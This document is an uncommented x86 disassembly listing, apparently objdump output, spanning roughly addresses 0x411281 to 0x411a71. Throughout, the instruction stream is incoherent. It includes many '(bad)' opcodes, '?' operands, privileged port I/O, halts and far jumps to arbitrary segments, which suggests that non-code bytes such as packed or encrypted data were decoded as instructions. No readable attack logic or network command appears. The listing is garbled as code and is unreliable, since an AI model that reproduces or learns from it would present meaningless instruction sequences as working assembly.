  411281:	xchg   esp,eax
  411282:	cmc    
  411283:	cdq    
  411284:	outs   dx,BYTE PTR ds:[esi]
  411285:	test   DWORD PTR [ebp+ebp*2+0x5ba23c93],edi
  41128c:	ret    0xb287
  41128f:	xor    eax,0xaf0a65f
  411294:	push   0x639aee41
  411299:	lock mov ds:0x4d8d7588,al
  41129f:	enter  0xce06,0x18
  4112a3:	jecxz  0x4112e2
  4112a5:	jmp    0x41125a
  4112a7:	mov    ebp,0x3d5f3ce1
  4112ac:	mov    ah,0x6b
  4112ae:	push   es
  4112af:	sub    cl,BYTE PTR [ecx]
  4112b1:	(bad)  
  4112b2:	out    0xfa,al
  4112b4:	add    ebp,DWORD PTR [ecx]
  4112b6:	pop    ebp
  4112b7:	pop    eax
  4112b8:	imul   eax,DWORD PTR [edx],0xf56efc2d
  4112be:	inc    edi
  4112bf:	jae    0x4112cd
  4112c1:	jge    0x411302
  4112c3:	nop
  4112c4:	lea    ecx,[edi+eiz*2+0x1791963c]
  4112cb:	mov    cl,0x7e
  4112cd:	dec    ecx
  4112ce:	adc    eax,0x2e7a07fb
  4112d3:	inc    esp
  4112d4:	in     al,dx
  4112d5:	cwde   
  4112d6:	scas   eax,DWORD PTR es:[edi]
  4112d7:	add    ch,BYTE PTR [eax]
  4112d9:	push   eax
  4112da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112db:	fld    TBYTE PTR [esi+ecx*2-0x76]
  4112df:	hlt    
  4112e0:	mov    ds:0xae486d21,al
  4112e5:	adc    BYTE PTR [ecx-0x39],dl
  4112e8:	pop    ds
  4112e9:	fdivr  st(4),st
  4112eb:	aaa    
  4112ec:	inc    edi
  4112ed:	mov    ah,0xd5
  4112ef:	dec    edi
  4112f0:	xchg   DWORD PTR [edi+0x5b],ecx
  4112f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112f4:	xor    BYTE PTR [eax],dl
  4112f6:	(bad)  
  4112f7:	sti    
  4112f8:	push   ecx
  4112f9:	xchg   DWORD PTR [esi],esp
  4112fb:	jne    0x41131f
  4112fd:	sbb    bl,BYTE PTR [edx-0x47]
  411300:	out    0xa0,al
  411302:	sbb    BYTE PTR [ebx],bl
  411304:	scas   al,BYTE PTR es:[edi]
  411305:	pop    ecx
  411306:	inc    edi
  411307:	stc    
  411308:	pusha  
  411309:	call   0x1ee2:0x6358805e
  411310:	and    esi,ebp
  411312:	sti    
  411313:	push   ecx
  411314:	cld    
  411315:	or     BYTE PTR [esi+0x51b6540e],0x41
  41131c:	cmp    BYTE PTR [esi+esi*2-0x68],ch
  411320:	mov    dl,0x4
  411322:	(bad)  
  411323:	cmp    DWORD PTR [edi+0x3de5dd4a],edx
  411329:	push   ds
  41132a:	popa   
  41132b:	add    DWORD PTR [ebx+0xa17a635],edi
  411331:	pop    ecx
  411332:	out    dx,eax
  411333:	push   cs
  411334:	daa    
  411335:	out    0x68,eax
  411337:	xor    BYTE PTR [edx-0x7d0e22d8],ah
  41133d:	adc    al,0x18
  41133f:	push   ecx
  411340:	frstor [ebx+0x476cf946]
  411346:	out    0xd0,al
  411348:	push   edx
  411349:	test   DWORD PTR [ebp+0x78],esp
  41134c:	(bad)  
  41134d:	and    al,0x41
  41134f:	in     eax,dx
  411350:	xchg   ecx,eax
  411351:	xchg   edi,eax
  411352:	hlt    
  411353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411354:	mov    eax,0x50a5dc4b
  411359:	scas   eax,DWORD PTR es:[edi]
  41135a:	ss scas eax,DWORD PTR es:[edi]
  41135c:	test   al,0xff
  41135e:	push   es
  41135f:	out    dx,al
  411360:	dec    esp
  411361:	ins    DWORD PTR es:[edi],dx
  411362:	adc    edx,DWORD PTR [edx]
  411364:	(bad)  
  411365:	out    dx,al
  411366:	or     DWORD PTR ds:0x964f6757,0x2bde1005
  411370:	pop    eax
  411371:	jge    0x411350
  411373:	or     al,0x78
  411375:	mov    ebx,0xe81fae0f
  41137a:	add    eax,0x6817cb1c
  41137f:	xchg   edx,eax
  411380:	inc    esp
  411381:	hlt    
  411382:	pop    ds
  411383:	ret    
  411384:	les    edi,FWORD PTR [esi]
  411386:	jae    0x4113a8
  411388:	mov    DWORD PTR [edx+eax*4],ebx
  41138b:	inc    edx
  41138c:	or     eax,0xe1803909
  411391:	(bad)
  411395:	stos   DWORD PTR es:[edi],eax
  411396:	mov    DWORD PTR [eax-0x16],ecx
  411399:	jl     0x4113f3
  41139b:	sti    
  41139c:	loop   0x41135e
  41139e:	xchg   edx,eax
  41139f:	adc    DWORD PTR [edi-0x2484f599],esi
  4113a5:	mov    edi,0xdddb92ea
  4113aa:	sub    al,0xe1
  4113ac:	adc    eax,0xbed414db
  4113b1:	push   esp
  4113b2:	inc    esi
  4113b3:	aad    0x27
  4113b5:	frstor [ebx-0x4592d716]
  4113bb:	scas   eax,DWORD PTR es:[edi]
  4113bc:	ret    
  4113bd:	icebp  
  4113be:	cmp    ch,BYTE PTR [esi]
  4113c0:	aam    0x2a
  4113c2:	hlt    
  4113c3:	xchg   edi,eax
  4113c4:	add    eax,0x1a8a6ced
  4113c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113cb:	add    ebx,edi
  4113cd:	cmp    eax,0x773c9554
  4113d2:	mov    ch,0x59
  4113d4:	or     bl,ch
  4113d6:	jnp    0x1d9bf1a9
  4113dc:	mov    ecx,?
  4113de:	les    ecx,FWORD PTR [edi]
  4113e0:	out    dx,eax
  4113e1:	jge    0x411379
  4113e3:	fidivr WORD PTR [ebx+0x75]
  4113e6:	sar    BYTE PTR [eax],1
  4113e8:	add    eax,0x3c74b0ac
  4113ed:	xlat   BYTE PTR ds:[ebx]
  4113ee:	adc    BYTE PTR [ecx-0x747ae5dd],dh
  4113f4:	mov    ebx,0x8b3aa94a
  4113f9:	test   BYTE PTR [eax+0x0],bl
  4113fc:	(bad)  
  4113fd:	retf   0xfbb6
  411400:	jp     0x4113f9
  411402:	test   DWORD PTR [ebx],esi
  411404:	rcl    DWORD PTR [edi-0x835ce71],0xca
  41140b:	imul   esp,DWORD PTR [esi-0x88600d6],0x2588d345
  411415:	mov    esp,0xf90e2a13
  41141a:	clc    
  41141b:	sbb    DWORD PTR [eax],0xf8c68fc3
  411421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411422:	xchg   BYTE PTR [eax],bl
  411424:	imul   edx,ecx,0xa0df0d6e
  41142a:	mov    al,0xa9
  41142c:	pop    edx
  41142d:	fucomp st(7)
  41142f:	jnp    0x4113d9
  411431:	scas   eax,DWORD PTR es:[edi]
  411432:	mov    ss,ecx
  411434:	or     bl,BYTE PTR [esi-0x57]
  411437:	fs lahf 
  411439:	xor    DWORD PTR [edi+0x1bee8a38],esi
  41143f:	push   DWORD PTR ds:0x6dcdfbc2
  411445:	lds    ecx,FWORD PTR [edi]
  411447:	sbb    DWORD PTR [edi+0xca40c92],ebx
  41144d:	ret    
  41144e:	dec    esi
  41144f:	jbe    0x4114c7
  411451:	sbb    al,0x2d
  411453:	inc    ecx
  411454:	test   eax,0x20cc9f2f
  411459:	repz sbb eax,0x4ad5a2b1
  41145f:	dec    ecx
  411460:	jmp    0xb591:0x5adb36f
  411467:	cmp    al,0xaf
  411469:	ret    0x133a
  41146c:	dec    ebp
  41146d:	(bad)  
  41146e:	int3   
  41146f:	bound  ecx,QWORD PTR ds:0x826fd432
  411475:	enter  0xbf21,0x15
  411479:	aad    0x4c
  41147b:	xor    al,0x52
  41147d:	jmp    0xd5659006
  411482:	and    al,0xb8
  411484:	mov    ds:0x857b8cf9,al
  411489:	stc    
  41148a:	jmp    0x411492
  41148c:	mov    ah,0x53
  41148e:	mov    ecx,0x751c8896
  411493:	sbb    ch,BYTE PTR [edx]
  411495:	in     eax,0xdf
  411497:	or     BYTE PTR [edi-0x1969e1fa],bl
  41149d:	outs   dx,BYTE PTR ds:[esi]
  41149e:	fild   QWORD PTR [esi+eiz*1]
  4114a1:	pop    ebx
  4114a2:	push   cs
  4114a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114a4:	and    dh,BYTE PTR [ebx]
  4114a6:	shl    edi,0xc3
  4114a9:	ss pop ebp
  4114ab:	in     al,0x90
  4114ad:	pop    ebx
  4114ae:	and    eax,0x458bb258
  4114b3:	xor    eax,0xfafdf5e8
  4114b8:	fild   DWORD PTR [ecx]
  4114ba:	lds    eax,FWORD PTR [edx+0x6a89e9a9]
  4114c0:	and    ah,BYTE PTR [edi+0x12]
  4114c3:	rcr    BYTE PTR [ebx],0xef
  4114c6:	adc    al,0x1d
  4114c8:	(bad)  
  4114c9:	sti    
  4114ca:	pusha  
  4114cb:	es fchs 
  4114ce:	das    
  4114cf:	inc    ebx
  4114d0:	pushf  
  4114d1:	fistp  WORD PTR [esp+ebp*1-0x68bdd416]
  4114d8:	retf   
  4114d9:	mov    WORD PTR [edi],gs
  4114db:	aaa    
  4114dc:	(bad)  
  4114dd:	div    BYTE PTR [edi-0x4d299f9b]
  4114e3:	push   esp
  4114e4:	jmp    0x411484
  4114e6:	xchg   ecx,eax
  4114e7:	gs pop ecx
  4114e9:	popa   
  4114ea:	mov    ecx,0x8111a81a
  4114ef:	nop
  4114f0:	push   ebp
  4114f1:	xor    al,0x5a
  4114f3:	into   
  4114f4:	ret    0xa32e
  4114f7:	jge    0x411545
  4114f9:	sub    DWORD PTR [edx+0x23],edi
  4114fc:	pop    ss
  4114fd:	pop    edx
  4114fe:	in     al,0xfe
  411500:	and    eax,0x8f7ce678
  411505:	and    DWORD PTR [edi-0x21b70b27],0x9c7a2c43
  41150f:	sub    ebx,DWORD PTR ds:0x91bea9e2
  411515:	add    dh,al
  411517:	addr16 dec edx
  411519:	mov    edi,0x593460ef
  41151e:	mov    ds:0x90468e6a,al
  411523:	test   al,0x5e
  411525:	cs pushf 
  411527:	sbb    DWORD PTR [ebx],ecx
  411529:	mov    dh,0xec
  41152b:	xchg   DWORD PTR [ebx+eax*2-0xb4867ba],ecx
  411532:	sar    ebx,cl
  411534:	mov    WORD PTR ds:0xa14e5545,es
  41153a:	jecxz  0x4114e1
  41153c:	iret   
  41153d:	out    dx,eax
  41153e:	out    0x50,eax
  411540:	xchg   esi,eax
  411541:	push   ebp
  411542:	loope  0x4115c3
  411544:	pop    edi
  411545:	mov    esi,0x664136bc
  41154a:	and    DWORD PTR [ecx-0x69],esi
  41154d:	mov    edx,0xdc762e65
  411552:	lds    edi,FWORD PTR [ebp-0x69035d1b]
  411558:	jl     0x4115a2
  41155a:	and    esi,DWORD PTR [esi-0x54]
  41155d:	or     BYTE PTR [esp+ecx*4-0x61be8b9],dh
  411564:	sub    bl,bh
  411566:	jge    0x41150b
  411568:	jl     0x41157d
  41156a:	pop    esi
  41156b:	mov    dh,0x4f
  41156d:	push   edi
  41156e:	jg     0x4115d6
  411570:	mov    ds:0x52f9cea4,eax
  411575:	outs   dx,BYTE PTR ds:[esi]
  411576:	sub    edi,DWORD PTR [edx+edi*1+0x40]
  41157a:	or     dh,bh
  41157c:	(bad)  
  41157d:	mov    bl,0x5d
  41157f:	jo     0x41155e
  411581:	jmp    0x411567
  411583:	push   ss
  411584:	and    eax,0x52bb640c
  411589:	or     BYTE PTR [edi],cl
  41158b:	jmp    0x4783:0x6bf5a43b
  411592:	mov    ah,0x67
  411594:	arpl   WORD PTR [ecx],cx
  411596:	loopne 0x4115e8
  411598:	cmc    
  411599:	push   esi
  41159a:	pushf  
  41159b:	xchg   ecx,eax
  41159c:	int    0xa6
  41159e:	outs   dx,DWORD PTR ds:[esi]
  41159f:	(bad)  
  4115a0:	xchg   edx,eax
  4115a1:	in     al,dx
  4115a2:	inc    esp
  4115a3:	popa   
  4115a4:	int    0x76
  4115a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115a7:	cdq    
  4115a8:	sbb    ah,BYTE PTR [edi+0x7e0d07f6]
  4115ae:	sbb    ebx,esp
  4115b0:	inc    esi
  4115b1:	jecxz  0x41154f
  4115b3:	adc    ah,BYTE PTR cs:[edi+0x47702003]
  4115ba:	cmc    
  4115bb:	sahf   
  4115bc:	sub    al,0xa0
  4115be:	sub    eax,0xbbf64af
  4115c3:	fidiv  DWORD PTR [edx]
  4115c5:	dec    ebp
  4115c6:	mov    bl,BYTE PTR ds:0xfc7c5787
  4115cc:	ins    BYTE PTR es:[edi],dx
  4115cd:	mov    ?,WORD PTR [edx-0x29e58314]
  4115d3:	push   ebx
  4115d4:	fadd   st(5),st
  4115d6:	jecxz  0x411563
  4115d8:	cs mov cs,edx
  4115db:	(bad)
  4115df:	mov    esi,0x68c8c1ff
  4115e4:	stos   BYTE PTR es:[edi],al
  4115e5:	xchg   DWORD PTR [esi+0x2f2f881e],edi
  4115eb:	inc    ebx
  4115ec:	mov    dh,0x52
  4115ee:	stc    
  4115ef:	or     ch,BYTE PTR [edi+0x3d070183]
  4115f5:	xlat   BYTE PTR ds:[ebx]
  4115f6:	pop    eax
  4115f7:	dec    edx
  4115f8:	ins    BYTE PTR es:[edi],dx
  4115f9:	dec    edx
  4115fa:	or     al,0x94
  4115fc:	xlat   BYTE PTR ds:[ebx]
  4115fd:	sub    ebp,DWORD PTR [esi-0x46]
  411600:	dec    eax
  411601:	sub    BYTE PTR [ebp+0xe37636],bl
  411607:	pop    edi
  411608:	or     edx,DWORD PTR [eax+0x7d]
  41160b:	xlat   BYTE PTR ds:[ebx]
  41160c:	xchg   esp,eax
  41160d:	(bad)  
  41160e:	and    al,0xc9
  411610:	mov    ch,0xf6
  411612:	repnz outs dx,BYTE PTR ds:[esi]
  411614:	ss call 0x71d2:0x6157b359
  41161c:	pop    ss
  41161d:	cmp    dh,0xc7
  411620:	je     0x4115fa
  411622:	daa    
  411623:	mov    ebx,0x11ce687b
  411628:	daa    
  411629:	je     0x411609
  41162b:	mov    ebx,0xe9a89edb
  411630:	xlat   BYTE PTR ds:[ebx]
  411631:	pusha  
  411632:	aam    0x2b
  411634:	mov    ebx,0xa5a3578
  411639:	sub    BYTE PTR [ecx+0x55],bl
  41163c:	xchg   DWORD PTR [ebx-0x57dbf210],eax
  411642:	loope  0x411668
  411644:	(bad)  
  411645:	out    dx,al
  411646:	adc    BYTE PTR [ebx+0x3d81f83c],bh
  41164c:	add    BYTE PTR [eax+0x46],0xa6
  411650:	(bad)  
  411651:	sar    DWORD PTR ds:0x685be0eb,1
  411657:	(bad)  
  411658:	and    dl,BYTE PTR [ebx-0x63]
  41165b:	cmp    dh,0xd3
  41165e:	call   0x2b55af85
  411663:	fsubp  st(7),st
  411665:	inc    eax
  411666:	or     al,0xab
  411668:	sbb    esp,ecx
  41166a:	call   0x7f7d:0xc852e4bb
  411671:	neg    BYTE PTR [edx+0x1c08216a]
  411677:	das    
  411678:	mov    edi,0xc76bd2a7
  41167d:	fsubr  QWORD PTR [ebx]
  41167f:	mov    ds:0xf1ed9bc1,eax
  411684:	scas   al,BYTE PTR es:[edi]
  411685:	jge    0x41162a
  411687:	jne    0x411686
  411689:	cli    
  41168a:	int    0x36
  41168c:	mov    ?,WORD PTR [edi-0x1c]
  41168f:	and    al,0x1c
  411691:	(bad)  
  411692:	in     eax,0xd1
  411694:	ds dec ebp
  411696:	(bad)  
  411698:	setne  BYTE PTR [ecx+ebp*1]
  41169c:	into   
  41169d:	push   esp
  41169e:	add    DWORD PTR [esi+0x783beb95],0xffffffe4
  4116a5:	outs   dx,BYTE PTR ds:[esi]
  4116a6:	adc    esi,esi
  4116a8:	aad    0x46
  4116aa:	call   0x6d4841fa
  4116af:	mov    dh,0xe2
  4116b1:	scas   al,BYTE PTR es:[edi]
  4116b2:	inc    esp
  4116b3:	jns    0x41170c
  4116b5:	adc    esp,ecx
  4116b7:	loope  0x411687
  4116b9:	hlt    
  4116ba:	cmp    ah,BYTE PTR [eax+0x40]
  4116bd:	retf   
  4116be:	add    BYTE PTR ds:0xb6b61198,ch
  4116c4:	cmp    DWORD PTR [ecx+0x4696541a],ebp
  4116ca:	sub    DWORD PTR [edi],ebx
  4116cc:	fimul  DWORD PTR [eax-0x52]
  4116cf:	push   0xf0b6d6e2
  4116d4:	add    esp,ecx
  4116d6:	mov    ah,0x62
  4116d8:	cmp    al,BYTE PTR [esi+edi*4-0x24dfee1]
  4116df:	sbb    eax,0xe1062198
  4116e4:	shr    BYTE PTR [ecx+0x4b3f4a6e],cl
  4116ea:	mov    ch,0x3b
  4116ec:	add    al,0x39
  4116ee:	sar    BYTE PTR [edi+0x56637bcd],cl
  4116f4:	repz jmp 0x411707
  4116f7:	and    ebp,DWORD PTR [edi-0x68aab6df]
  4116fd:	call   0x71188260
  411702:	push   edx
  411703:	pop    edx
  411704:	sar    ecx,cl
  411706:	sub    edx,DWORD PTR [esi+0x24]
  411709:	inc    ebp
  41170a:	inc    edi
  41170b:	je     0x41170f
  41170d:	push   ebx
  41170e:	mov    ebx,0x3386cc6a
  411713:	out    dx,al
  411714:	push   0xafb978ea
  411719:	arpl   WORD PTR [edx],ax
  41171b:	or     DWORD PTR ds:[ebx+0x6e6027d9],ebx
  411722:	imul   esi,DWORD PTR [esi+0x6],0x6b0e053e
  411729:	arpl   WORD PTR [ebx-0x71],di
  41172c:	xchg   edi,eax
  41172d:	or     ebx,DWORD PTR [edi-0x1c]
  411730:	retf   
  411731:	sti    
  411732:	fmul   QWORD PTR [esi]
  411734:	mov    DWORD PTR [esi+0x70],esp
  411737:	aaa    
  411738:	in     eax,dx
  411739:	and    DWORD PTR [ecx-0x1644881a],esi
  41173f:	nop
  411740:	pop    ds
  411741:	pop    es
  411742:	and    esp,ebx
  411744:	icebp  
  411745:	xor    eax,DWORD PTR [ebx]
  411747:	test   eax,0x9d17fa0a
  41174c:	xchg   ebx,eax
  41174d:	push   ds
  41174e:	popa   
  41174f:	imul   esp,ecx,0xffffffe6
  411752:	fcomp  DWORD PTR [esi]
  411754:	rcr    DWORD PTR [edi],cl
  411756:	inc    edi
  411757:	test   al,0xdd
  411759:	mov    ebp,0xe482f19e
  41175e:	sbb    dl,ch
  411760:	scas   al,BYTE PTR es:[edi]
  411761:	inc    ebp
  411762:	cmp    ecx,DWORD PTR [ecx]
  411764:	jnp    0x4117a6
  411766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411767:	dec    edx
  411768:	mov    al,0xbe
  41176a:	cwde   
  41176b:	jmp    0xc57dffb0
  411770:	push   ecx
  411771:	retf   
  411772:	xchg   ebx,eax
  411773:	add    edi,eax
  411775:	cmp    ah,al
  411777:	and    al,0xe6
  411779:	mov    eax,0xc5dbb47d
  41177e:	pop    edi
  41177f:	xor    eax,0x794dbd7c
  411784:	in     al,dx
  411785:	sub    al,0xe
  411787:	test   eax,0x2c216b39
  41178c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41178d:	fst    QWORD PTR [edx]
  41178f:	test   eax,0x575663b9
  411794:	mov    ch,0xb7
  411796:	inc    esi
  411797:	pop    ds
  411798:	adc    al,0x7
  41179a:	jb     0x4117b8
  41179c:	push   0xffffff9a
  41179e:	push   ss
  41179f:	inc    esp
  4117a0:	jl     0x411761
  4117a2:	xor    DWORD PTR [eax],ebx
  4117a4:	add    DWORD PTR [edi+0x3239d1fc],esp
  4117aa:	je     0x411792
  4117ac:	test   eax,0xb4dea799
  4117b1:	neg    BYTE PTR [ebp+0x56]
  4117b4:	and    bl,BYTE PTR [ebx+0x6c616ab2]
  4117ba:	pop    esi
  4117bb:	fs cwde 
  4117bd:	dec    ebp
  4117be:	cmp    BYTE PTR [edi+0x1847ab91],bl
  4117c4:	sbb    esp,DWORD PTR [ecx-0x277bf399]
  4117ca:	xchg   edx,eax
  4117cb:	cs aad 0xad
  4117ce:	xor    bh,BYTE PTR [esi]
  4117d0:	dec    ebx
  4117d1:	mov    ds:0x1ae08b1c,al
  4117d6:	cwde   
  4117d7:	inc    ecx
  4117d8:	sbb    esi,edx
  4117da:	jo     0x4117d7
  4117dc:	adc    BYTE PTR [ebx+0x61],0x34
  4117e0:	repnz in al,dx
  4117e2:	enter  0xf60b,0xc2
  4117e6:	mov    BYTE PTR ds:[edx+ebx*2-0x267739a9],cl
  4117ee:	popa   
  4117ef:	es int 0xc0
  4117f2:	leave  
  4117f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f4:	outs   dx,BYTE PTR ds:[esi]
  4117f5:	popa   
  4117f6:	jae    0x4117b3
  4117f8:	call   0x7fa54b3a
  4117fd:	repz dec ebx
  4117ff:	sbb    al,0x7b
  411801:	lea    edi,[edx+eax*1+0x1097ecc7]
  411808:	inc    esp
  411809:	jge    0x411800
  41180b:	outs   dx,BYTE PTR ds:[esi]
  41180c:	mov    dl,0x8
  41180e:	(bad)  
  41180f:	pop    esi
  411810:	add    eax,0x5ee4e0e3
  411815:	mov    eax,ds:0xd76c07a4
  41181a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41181b:	imul   edi,DWORD PTR [ecx-0x8],0x3a
  41181f:	in     al,0xb7
  411821:	sbb    ecx,DWORD PTR ds:0x224c3f2f
  411827:	cmp    ch,BYTE PTR [ebp+0x294bed93]
  41182d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41182e:	dec    esi
  41182f:	lahf   
  411830:	pop    esi
  411831:	pop    ss
  411832:	push   eax
  411833:	sub    DWORD PTR [eax],0x3811e14d
  411839:	adc    DWORD PTR [esi+0x5f],ebp
  41183c:	ins    BYTE PTR es:[edi],dx
  41183d:	aad    0x78
  41183f:	ficomp WORD PTR [esi]
  411841:	adc    BYTE PTR [eax],al
  411843:	pusha  
  411844:	scas   eax,DWORD PTR es:[edi]
  411845:	iret   
  411846:	fistp  QWORD PTR fs:[ebx-0x48a9c57f]
  41184d:	sbb    eax,0xa1454792
  411852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411853:	inc    ebx
  411854:	inc    edx
  411855:	ror    BYTE PTR [ecx-0x6b0db5d3],0x2e
  41185c:	gs mov esi,0xe6916d24
  411862:	lods   eax,DWORD PTR ds:[esi]
  411863:	push   eax
  411864:	loopne 0x4118bb
  411866:	pop    edx
  411867:	fstp   QWORD PTR [ebx+0xe]
  41186a:	in     al,dx
  41186b:	push   ebx
  41186c:	outs   dx,BYTE PTR ds:[esi]
  41186d:	mov    edx,0x4127ea6f
  411872:	mov    eax,0x1fdbb075
  411877:	pushf  
  411878:	jle    0x411821
  41187a:	push   ss
  41187b:	aam    0xc4
  41187d:	adc    ebx,esp
  41187f:	and    edi,0xb
  411882:	lods   eax,DWORD PTR ds:[esi]
  411883:	or     eax,0xd175ce6e
  411888:	mov    eax,0x95590938
  41188d:	cmc    
  41188e:	shl    DWORD PTR [esi+0x13e011a1],0x54
  411895:	ret    0x359b
  411898:	mov    ch,0x1f
  41189a:	les    ebp,FWORD PTR [eax+0x7b]
  41189d:	xchg   ebp,eax
  41189e:	pop    ds
  41189f:	jecxz  0x4118b6
  4118a1:	jns    0x4118f9
  4118a3:	jo     0x411891
  4118a5:	mov    dl,0x64
  4118a7:	lds    ebp,FWORD PTR [edi-0xa267ae0]
  4118ad:	int3   
  4118ae:	xor    DWORD PTR [ecx-0x1ee5581e],esp
  4118b4:	jg     0x411845
  4118b6:	test   al,0x54
  4118b8:	inc    edx
  4118b9:	adc    ecx,eax
  4118bb:	or     DWORD PTR [eax+0x586fcda],ebx
  4118c1:	cs fwait
  4118c3:	mov    al,BYTE PTR [edx+0x6e]
  4118c6:	es mov eax,0x252c1eb5
  4118cc:	rcl    ah,1
  4118ce:	(bad)  
  4118cf:	call   ebp
  4118d1:	sbb    ah,BYTE PTR [ebp-0x45]
  4118d4:	jle    0x41191f
  4118d6:	adc    DWORD PTR [edx+esi*2+0x7990cc99],edi
  4118dd:	xchg   edx,eax
  4118de:	neg    DWORD PTR [edi+0x31b28cc5]
  4118e4:	lahf   
  4118e5:	dec    ecx
  4118e6:	dec    esi
  4118e7:	mov    ds:0x49974dca,al
  4118ec:	sahf   
  4118ed:	test   DWORD PTR [edx],edx
  4118ef:	xor    eax,0x51668af2
  4118f4:	retf   
  4118f5:	int3   
  4118f6:	ror    DWORD PTR [esi],cl
  4118f8:	jmp    0x411919
  4118fa:	rcl    BYTE PTR [ecx-0x13c9c30],cl
  411900:	pop    edi
  411901:	add    DWORD PTR ds:0x6d3ed6e9,esp
  411907:	cmp    eax,0x195e1136
  41190c:	sub    al,0x2
  41190e:	mov    eax,ds:0x44aef0ee
  411913:	(bad)  
  411914:	rcr    DWORD PTR [edx],1
  411916:	jbe    0x411902
  411918:	or     eax,0xcd282213
  41191d:	cmp    DWORD PTR [edi+0x68],edi
  411920:	fidivr DWORD PTR [edx+0x56432fe5]
  411926:	pop    esp
  411927:	xchg   esi,eax
  411928:	pop    edx
  411929:	stc    
  41192a:	inc    ebp
  41192b:	popa   
  41192c:	jge    0x411961
  41192e:	mov    eax,ds:0x941a7c7
  411933:	push   edx
  411934:	les    edx,FWORD PTR [eax+0x3e]
  411937:	xchg   ebp,eax
  411938:	stos   BYTE PTR es:[edi],al
  411939:	icebp  
  41193a:	adc    eax,0x9e935a3
  41193f:	add    al,dh
  411941:	adc    esi,eax
  411943:	test   DWORD PTR [ebx-0x23],esp
  411946:	in     al,0xd4
  411948:	mov    ah,0x77
  41194a:	cmc    
  41194b:	inc    eax
  41194c:	add    ebx,eax
  41194e:	call   0xeb8c10
  411953:	xchg   DWORD PTR [ebx],edi
  411955:	loopne 0x411910
  411957:	cmp    edx,ebp
  411959:	and    eax,0x834463d1
  41195e:	cdq    
  41195f:	mov    ds:0x4e122337,eax
  411964:	mov    al,ds:0x4238332
  411969:	pop    edi
  41196a:	ss pop esp
  41196c:	aam    0xc9
  41196e:	out    0x21,eax
  411970:	ins    BYTE PTR es:[edi],dx
  411971:	call   0xf3b32746
  411976:	xor    eax,DWORD PTR [ebx+ebp*8]
  411979:	jo     0x411997
  41197b:	mov    BYTE PTR [esi],0x25
  41197e:	or     ch,cl
  411980:	sub    BYTE PTR [edx-0x5fab20c0],ah
  411986:	es ins BYTE PTR es:[edi],dx
  411988:	or     BYTE PTR [edx],al
  41198a:	cdq    
  41198b:	daa    
  41198c:	mov    ebp,esi
  41198e:	push   edi
  41198f:	call   0xbe2e62c3
  411994:	push   0xffffffc7
  411996:	inc    edi
  411997:	(bad)  
  411998:	jmp    FWORD PTR [esi+0x28ba8cfd]
  41199e:	ret    
  41199f:	xor    ecx,DWORD PTR [edx+0x61068ba3]
  4119a5:	jecxz  0x41194e
  4119a7:	outs   dx,DWORD PTR ds:[esi]
  4119a8:	cmp    BYTE PTR [edi],ah
  4119aa:	xchg   esp,eax
  4119ab:	outs   dx,BYTE PTR ds:[esi]
  4119ac:	call   0xbd41:0xd263029
  4119b3:	xor    DWORD PTR [ebp+0x5],edx
  4119b6:	mov    ds:0xf365fbfb,al
  4119bb:	cmp    DWORD PTR [edi+0x3c],esi
  4119be:	ror    DWORD PTR [eax+0x60],0xa4
  4119c2:	test   eax,0xfb7232be
  4119c7:	mov    edx,0x77348ed7
  4119cc:	out    dx,eax
  4119cd:	or     al,0xd7
  4119cf:	shl    BYTE PTR [eax-0x2e],1
  4119d2:	fist   DWORD PTR [ecx-0x33]
  4119d5:	das    
  4119d6:	add    al,0x2
  4119d8:	or     eax,0xad7623b7
  4119dd:	cmp    eax,0xabd4f480
  4119e2:	xchg   edx,eax
  4119e3:	fistp  QWORD PTR [ecx]
  4119e5:	or     al,0xa3
  4119e7:	jae    0x4119cf
  4119e9:	push   0x3
  4119eb:	pop    ebx
  4119ec:	inc    ebx
  4119ed:	xchg   ebx,ecx
  4119ef:	jmp    0x413d7d
  4119f4:	popf   
  4119f5:	add    eax,0xa840804
  4119fa:	xchg   ecx,eax
  4119fb:	adc    bl,0x9b
  4119fe:	pop    eax
  4119ff:	in     al,dx
  411a00:	sub    al,BYTE PTR [ebx-0x75f4e5fd]
  411a06:	add    DWORD PTR [ebx-0x7c7ca1f4],0xffffffea
  411a0d:	inc    ecx
  411a0e:	mov    al,0x89
  411a10:	(bad)  
  411a11:	lods   eax,DWORD PTR ds:[esi]
  411a12:	add    DWORD PTR [ecx+0xe],0xffffffdf
  411a16:	add    BYTE PTR [edx-0x3e],cl
  411a19:	das    
  411a1a:	push   ss
  411a1b:	sbb    cl,BYTE PTR [ebx]
  411a1d:	ret    0x7c03
  411a20:	pop    es
  411a21:	mov    dh,0xfb
  411a23:	jnp    0x411a91
  411a25:	jge    0x411a40
  411a27:	imul   ebp,DWORD PTR [edx-0x74],0x94f04845
  411a2e:	xor    bl,dh
  411a30:	pop    ss
  411a31:	sbb    bh,al
  411a33:	sahf   
  411a34:	mov    ecx,0x4f875160
  411a39:	nop
  411a3a:	push   0x534ebbf1
  411a3f:	pop    ecx
  411a40:	jno    0x411ab9
  411a42:	jae    0x411ab2
  411a44:	and    ah,ah
  411a46:	mov    edi,0xdc247054
  411a4b:	arpl   WORD PTR [edi-0x5b],sp
  411a4e:	xchg   ebx,eax
  411a4f:	out    dx,eax
  411a50:	(bad)  
  411a51:	jno    0x4119ff
  411a53:	out    0xc3,al
  411a55:	mov    dh,0x5d
  411a57:	stos   DWORD PTR es:[edi],eax
  411a58:	repnz or DWORD PTR [edx+0x68250500],eax
  411a5f:	sbb    ebx,esp
  411a61:	inc    edx
  411a62:	dec    esi
  411a63:	(bad)  
  411a64:	mov    dl,0xf2
  411a66:	imul   edi,DWORD PTR [edi+0x4f],0xffffffff
  411a6a:	sub    cl,BYTE PTR [ebx-0x20]
  411a6d:	jmp    0x4119ff
  411a6f:	jbe    0x411a82
  411a71:	das    
